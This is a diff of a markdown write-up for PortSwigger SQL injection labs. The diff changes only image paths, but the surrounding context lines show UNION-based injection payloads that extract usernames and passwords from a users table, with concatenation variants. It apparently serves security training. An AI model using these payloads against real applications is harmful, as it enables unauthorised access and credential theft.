@@ -128,7 +128,7 @@ category=' union select username, password from users--
 ```
 - Here we can see the results from my injected query, and now we can log in as the `administrator` user.
 
-![lab5.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/In-Band%20SQLi%20images/lab5.png)
+![lab5.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/lab5.png)
 
 -----------------------------------------------------------------------
 ### Lab6: SQL injection UNION attack, retrieving multiple values in a single column
@@ -151,11 +151,11 @@ category=' union select null, username ||'~'|| password from users--
 ```
 - `Note:` You can set any specific character to separate columns other than `~`.
 
-![lab6.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/In-Band%20SQLi%20images/lab6.png)
+![lab6.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/lab6.png)
 
 - Or you can make something like that by concatenating😃
 ```
 category=' union select null, 'User: '|| username ||' and password: '|| password from users--
 ```
 
-![lab6_another_form.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/In-Band%20SQLi%20images/lab6_another_form.png)
+![lab6_another_form.png](https://github.com/Sec0gh/Portswigger-Labs/blob/main/SQL%20Injection%20Labs/images/lab6_another_form.png)
